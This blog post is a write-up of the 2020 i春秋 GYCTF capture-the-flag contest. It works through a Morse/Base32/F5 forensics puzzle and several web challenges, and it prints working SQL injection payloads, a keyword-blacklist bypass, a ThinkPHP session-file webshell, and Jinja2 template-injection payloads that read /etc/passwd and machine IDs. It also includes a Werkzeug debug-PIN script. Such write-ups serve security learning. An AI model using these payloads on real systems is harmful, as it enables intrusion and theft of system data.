---
title: GYCTF——2020i春秋新春战疫CTF——网络安全公益赛
date: 2020-02-25
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# GYCTF——2020i春秋新春战疫CTF——网络安全公益赛

## MISC

### code_in_morse

下载下来是压缩包,解压是流量包,用wireshark分析,过滤http

发现上传文件的upload.php,跟踪流里面是morse码,morse解码是一堆字母加数字,很像base64,但是其中没有1没有8数字只要2-7,因为上传的是文件,base32解码成文件,下面这个工具解码得到一个图片

<!-- more -->

[Base32 Decode File](https://emn178.github.io/online-tools/base32_decode_file.html)

图片不知道是什么,用google识图搜索后发现一种很类似的条形码格式PDF417,随认为是该种条形码,用一下工具进行识别,识别出一个网站,网站是一张图片

[![mark](https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim)](https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim)

[条形码二维码识别](https://online-barcode-reader.inliteresearch.com/)

[![mark](https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim)](https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim)

Stegsolve分析文件格式出现F5,是F5隐写,用GitHub的F5隐写工具解密,没有密码,得到flag

## WEB

### 简单的招聘系统

这个题拿到手先是一个登录框,尝试了万能密码什么的发现总是未知错误,以为是我的原因,经群里大佬提醒容器不稳定,重新下发,发现万能密码登录成功

浏览各个页面发现AdminPage有一个serach for key的查询框

[![mark](https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim)](https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim)

尝试sql注入,有回显,有错误提示,直接有回显的sql注入一套,得flag

```
' or 1=1 order by 5#
' or 1=1 order by 6#
#5有回显,6没有

' or 1=1 union select 1,2,3,4,5#
#admin变成2,输出位置在2

' or 1=1 union select 1,group_concat(database()),3,4,5#
#查库

' or 1=1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()#
#查表

' or 1=1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database() and table_name='flag'#
#查字段

' or 1=1 union select 1,group_concat(flaaag),3,4,5 from flag#
#查内容
```

### equpload

这个题也很简单,直接上传一句话getshell,读取根目录下面的flag

(没有任何过滤?不知道是不是主办方的失误,无从得知)

### blacklist

过滤了set|prepare|alter|rename|select|update|delete|drop|insert|where|

但是mysql还有一种查询姿势

```
1';show tables;
#查表
1';desc FlagHere;
#查字段
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
#读取内容
```

### easy_thinking

这个利用的是ThinkPHP<6.0.2的一个任意文件内容写入覆盖漏洞

可以通过控制cookies中的PHPSESSIONID字段内容来达到控制session目录下生成的文件名

详情可以查看

[ThinkPHP<6.0.2任意文件内容写入/覆盖](https://zhzhdoai.github.io/2020/01/25/ThinkPHP-6-0-2任意文件内容写入-覆盖/)

网站目录下有[www.zip.下载下来查看控制器文件,发现session文件内容存储的是查询页的key值](http://www.zip.下载下来查看控制器文件,发现session文件内容存储的是查询页的key值/)

[![mark](https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim)](https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim)

注册,登录,构造查询页面的key为一句话木马,cookies下面的PHPSESSIONID字段PHPSESSID=1234567890123456789012345678.php

然后访问用蚁剑链接

```
http://123.57.212.112:7891/runtime/session/sess_1234567890123456789012345678.php
```

getshell

查看php.ini是禁用了系统执行函数的,这时需要使用蚁剑的绕过disable_function的插件选择模式进行链接,成功绕过disable_function后即可执行根目录下面readflag

[![mark](https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim)](https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim)

### flaskapp

在decode亚目输入123发现debug页面,分析页面,得出页面路径

[![mark](https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim)](https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim)

得出formate格式化字符串漏洞,配合发现jinja2模板注入

尝试去获取6个变量值

```
username # 用户名
modname # flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')) # Flask
getattr(mod, '__file__', None) # flask目录下的一个app.py的绝对路径
uuid.getnode() # mac地址十进制
get_machine_id() # /etc/machine-id
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}  
eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9


结果 ： root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
flaskweb:x:1000:1000::/home/flaskweb:
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address', 'r').read() }}{% endif %}{% endfor %}
eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfSAg
MAC地址:02:42:ac:12:00:0a
MAC地址十进制:2485377957898
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup', 'r').read() }}{% endif %}{% endfor %}

eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9

12:freezer:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 11:cpuset:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 10:cpu,cpuacct:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 9:devices:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 8:hugetlb:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 7:blkio:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 6:memory:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 5:pids:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 4:net_cls,net_prio:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 3:rdma:/ 2:perf_event:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 1:name=systemd:/docker/3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 0::/system.slice/containerd.service
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/machine-id', 'r').read() }}{% endif %}{% endfor %}

eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9tYWNoaW5lLWlkJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ==

81ef01dec0f0eb6d6c0f3752b487b10e
```

利用获取到的信息爆破pin

```
import hashlib
from itertools import chain
probably_public_bits = [
	'flaskweb',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2485377957898',# str(uuid.getnode()),  /sys/class/net/eth0/address
	'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'
    # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```

- 利用pin码进入debug界面
- 读取flag

```
import os
os.listdir('/')
open('this_is_the_flag.txt','r').read()
```

[![mark](https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim)](https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim)